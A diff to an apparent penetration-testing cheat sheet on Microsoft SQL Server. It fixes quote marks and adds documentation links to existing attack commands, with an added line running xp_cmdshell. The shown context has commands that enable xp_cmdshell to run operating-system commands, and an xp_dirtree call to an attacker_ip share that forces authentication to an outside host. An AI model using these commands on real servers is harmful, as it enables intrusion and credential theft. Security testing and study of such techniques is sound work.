@@ -28,6 +28,7 @@ impacket-mssqlclient $user:$hostname@$IP -windows-auth
 -no-pass
 ```
 
+Basic Queries
 ```sql
 SELECT @@version					 	-- version check
 SELECT DB_NAME()						-- current database
@@ -65,12 +66,12 @@ SELECT *
 
 ## Command Execution
 
-Check if cmdshell is already active
+Check if [xp_cmdshell (Transact-SQL)](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15)  is already active or enabled it [server configuration option: xp_cmdshell](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-ver15)
 ```sql   
-EXEC xp_cmdshell ‘net user’; -- privOn MSSQL 2005 you may need to reactivate xp_cmdshell first as it’s disabled by default:
-EXEC sp_configure ‘show advanced options’, 1; -- priv  
+EXEC xp_cmdshell 'net user'; -- privOn MSSQL 2005 you may need to reactivate xp_cmdshell first as it’s disabled by default:
+EXEC sp_configure 'show advanced options', 1; -- priv  
 RECONFIGURE; -- priv  
-EXEC sp_configure ‘xp_cmdshell’, 1; -- priv  
+EXEC sp_configure 'xp_cmdshell', 1; -- priv  
 RECONFIGURE; -- priv
 -- OR
 EXEC mast.dbo.xp_cmdshell 'cmd';
@@ -78,6 +79,8 @@ EXEC mast.dbo.xp_cmdshell 'cmd';
 EXECUTE sp_configure 'show advanced options', 1;
 RECONFIGURE;
 EXECUTE sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+EXECUTE xp_cmdshell 'net user';
 ```
 
 Arbituary File Reading with xp_dirtree
@@ -104,3 +107,4 @@ xp_dirtree "\\attacker_ip\Share"
 [Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)
 [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) 
 [PowerUpSQL CheatSheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)
+[xp_cmdshell (Transact-SQL)](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15)  
